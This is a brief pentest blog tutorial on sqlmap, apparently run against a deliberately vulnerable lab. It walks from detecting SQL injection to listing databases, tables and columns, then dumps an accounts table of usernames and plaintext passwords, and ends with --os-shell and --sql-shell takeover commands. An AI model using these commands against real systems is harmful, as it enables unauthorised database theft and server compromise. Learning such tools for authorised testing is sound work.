+++
categories = ["Pentest", "Web"]
date = "2021-02-15"
title = "SQL Map"
type = ["posts","post"]
[ author ]
  name = "nazori"
+++

sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.

First we have to do a fail request to get the url we want to inject on. Then we go to the terminal to start the program:

```
sqlmap -u "our url"

...

[04:16:07] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:16:07] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:16:07] [INFO] target URL appears to have 5 columns in query
[04:16:08] [INFO] GET parameter 'username' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable

```
This will show information about the parameters that can be injected. Now we are going to navigate inside the databases:


* Databases 

```
sqlmap -u "our url" --dbs

...

available databases [7]:
[*] dvwa
[*] information_schema
[*] metasploit
[*] mysql
[*] owasp10
[*] tikiwiki
[*] tikiwiki195

```
* Tables on database

```
sqlmap -u "our url" --tables -D owasp10

...

Database: owasp10
[6 tables]
+----------------+
| accounts       |
| blogs_table    |
| captured_data  |
| credit_cards   |
| hitlog         |
| pen_test_tools |
+----------------+

```
* The columns

```
sqlmap -u "our url" --columns -T accounts -D owasp10

...

Database: owasp10
Table: accounts
[5 columns]
+-------------+------------+
| Column      | Type       |
+-------------+------------+
| cid         | int(11)    |
| is_admin    | varchar(5) |
| mysignature | text       |
| password    | text       |
| username    | text       |
+-------------+------------+

```

* Info on the table

```
sqlmap -u "our url" -T accounts -D owasp10 --dump

...

Database: owasp10
Table: accounts
[17 entries]
+-----+----------+--------------+----------+-----------------------------+
| cid | is_admin | password     | username | mysignature                 |
+-----+----------+--------------+----------+-----------------------------+
| 1   | TRUE     | adminpass    | admin    | Monkey!                     |
| 2   | TRUE     | somepassword | adrian   | Zombie Films Rock!          |
| 3   | FALSE    | monkey       | john     | I like the smell of confunk |
| 4   | FALSE    | password     | jeremy   | d1373 1337 speak            |
| 5   | FALSE    | password     | bryce    | I Love SANS                 |
| 6   | FALSE    | samurai      | samurai  | Carving Fools               |
| 7   | FALSE    | password     | jim      | Jim Rome is Burning         |
| 8   | FALSE    | password     | bobby    | Hank is my dad              |
| 9   | FALSE    | password     | simba    | I am a cat                  |
| 10  | FALSE    | password     | dreveil  | Preparation H               |
| 11  | FALSE    | password     | scotty   | Scotty Do                   |
| 12  | FALSE    | password     | cal      | Go Wildcats                 |
| 13  | FALSE    | password     | john     | Do the Duggie!              |
| 14  | FALSE    | 42           | kevin    | Doug Adams rocks            |
| 15  | FALSE    | set          | dave     | Bet on S.E.T. FTW           |
| 16  | FALSE    | pentest      | ed       | Commandline KungFu anyone?  |
| 17  | NULL     | jeje         | nazori   | lol                         |
+-----+----------+--------------+----------+-----------------------------+


```

##### More commands

Who is the user.

`sqlmap -u "our url" --current-user`

Which database are we injecting on.

`sqlmap -u "our url" --current-db`

##### Inject Shell

Creates a shell on the OS (ASP, ASPX, JSP, PHP). Normally the servers don't allow to upload php shells.

`sqlmap -u "our url" --os-shell`

Creates a shell inside the SQL interpreter so we can make sql requests more comfortable.

`sqlmap -u "our url" --sql-shell`

